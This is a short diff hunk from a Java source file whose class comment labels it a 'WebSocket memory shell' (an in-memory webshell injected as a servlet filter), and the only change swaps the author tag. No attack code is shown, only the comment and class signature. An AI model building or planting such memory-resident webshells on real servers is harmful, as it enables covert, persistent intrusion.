@@ -9,7 +9,7 @@ import java.util.List;
 
 /**
  * WebSocket 内存马
- * @author nu1r
+ * @author QI4L
  */
 public class WSFMSFromThread implements Filter {
 
